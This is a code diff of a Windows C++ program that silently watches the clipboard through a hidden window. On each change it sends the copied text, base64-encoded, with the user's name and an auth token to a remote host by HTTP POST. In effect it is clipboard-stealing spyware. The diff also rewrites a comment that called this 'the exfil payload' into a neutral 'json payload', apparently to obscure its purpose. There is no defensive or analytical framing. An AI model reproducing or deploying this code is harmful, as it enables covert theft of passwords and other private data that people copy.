@@ -13,16 +13,12 @@
 
 #include "bupkus.h"
 
-HINSTANCE g_Instance = nullptr;
-HWND g_Window = nullptr;
-HANDLE g_SendMutex = nullptr;
 
-static monstars::Cooldown s_Cooldown(c_PasteCooldown);
+HWND g_Window = nullptr;
+
 
 DWORD SendClipboardText(void*)
 {
-    // opening the clipboard can fail if someone else has it locked
-    //   retry a few times until we get it, or give up
     bool clipboard = false;
     int attempts = c_ClipboardAttempts;
     int wait_amount = c_ClipboardInterval;
@@ -47,7 +43,7 @@ DWORD SendClipboardText(void*)
     }
 
     monstars::HeapBuffer textBuf;
-    if (HANDLE data = GetClipboardData(CF_TEXT))
+    if (HANDLE data = GetClipboardData(CF_TEXT))  // never close data handle
     {
         auto text = static_cast<char*>(GlobalLock(data));
         if (text)
@@ -66,7 +62,6 @@ DWORD SendClipboardText(void*)
     }
 
     // convert the text to base64 (avoids json encoding problems)
-    //   - first call gets the needed buffer size
     DWORD enc_size = 0;
     (void)CryptBinaryToStringA(textBuf.Get<byte>(), static_cast<DWORD>(textBuf.Size()),
                                CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &enc_size);
@@ -78,12 +73,12 @@ DWORD SendClipboardText(void*)
         return ERROR_ENCRYPTION_FAILED;
     }
 
-    // construct the exfil payload - includes current username
+    // grab current username for the json payload
     char username[MAX_PATH];
     DWORD nameSize = sizeof(username);
     (void)GetUserNameA(username, &nameSize);
 
-    // first get the required size
+    // construct the json payload
     size_t jsonSize = snprintf(nullptr, 0, c_JsonTemplate, c_AuthToken, username, encBuf.Get());
     if (jsonSize < 1)
     {
@@ -93,27 +88,18 @@ DWORD SendClipboardText(void*)
     monstars::HeapBuffer jsonBuf(jsonSize + 1);
     snprintf(jsonBuf.Get(), jsonBuf.Size(), c_JsonTemplate, c_AuthToken, username, encBuf.Get());
 
+    // send the POST request
     attempts = c_ConnectAttempts;
     do
     {
-        // scoped lock
+        monstars::HttpClient client(c_Hostname);
+        if (client.PostRequest(c_Endpoint, jsonBuf.Get(), strnlen(jsonBuf.Get(), jsonBuf.Size()), c_ContentType))
         {
-            monstars::MutexLock lock(g_SendMutex, 300000);  // 5 minute timeout
-            if (!lock)
-            {
-                LOG_LINE_ERROR;
-                return ERROR_LOCK_FAILED;
-            }
-            monstars::HttpClient client(c_Hostname);
-            if (client.PostRequest(c_Endpoint, jsonBuf.Get(), strnlen(jsonBuf.Get(), jsonBuf.Size()), c_ContentType))
-            {
-                return ERROR_SUCCESS;
-            }
-            if (client.Forbidden())
-            {
-                LOG_LINE_ERROR;
-                return ERROR_ACCESS_DENIED;
-            }
+            return ERROR_SUCCESS;
+        }
+        if (client.Forbidden())
+        {
+            return ERROR_ACCESS_DENIED;
         }
         if (--attempts) Sleep(c_ConnectInterval);
     } while (attempts);
@@ -124,10 +110,15 @@ DWORD SendClipboardText(void*)
 
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int)
 {
-    g_Instance = hInstance;
-    g_SendMutex = CreateMutexW(nullptr, 0, nullptr);
+    monstars::ObjectHandle bupkus = OpenMutexW(SYNCHRONIZE, false, c_AuthToken);
+    if (bupkus)
+    {
+        ExitProcess(ERROR_ALREADY_EXISTS);
+    }
+    bupkus = CreateMutexW(nullptr, true, c_AuthToken);
+
     g_Window = CreateWindowExW(WS_EX_NOACTIVATE, L"STATIC", nullptr, WS_OVERLAPPEDWINDOW, 0, 0,
-                               0, 0, HWND_MESSAGE, nullptr, g_Instance, nullptr);
+                               0, 0, HWND_MESSAGE, nullptr, hInstance, nullptr);
 
     if (!AddClipboardFormatListener(g_Window))
     {
@@ -137,6 +128,8 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int)
 
     while (true)
     {
+        monstars::Cooldown cooldown(c_PasteCooldownTime);
+
         static MSG msg = {};
 
         switch (GetMessageW(&msg, nullptr, 0, 0))
@@ -147,7 +140,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int)
         default:
             if (msg.message == WM_CLIPBOARDUPDATE)
             {
-                if (IsClipboardFormatAvailable(CF_UNICODETEXT) && s_Cooldown)
+                if (IsClipboardFormatAvailable(CF_UNICODETEXT) && cooldown)
                 {
                     monstars::ObjectHandle thread = CreateThread(nullptr, 0, SendClipboardText, nullptr, 0, nullptr);
                 }
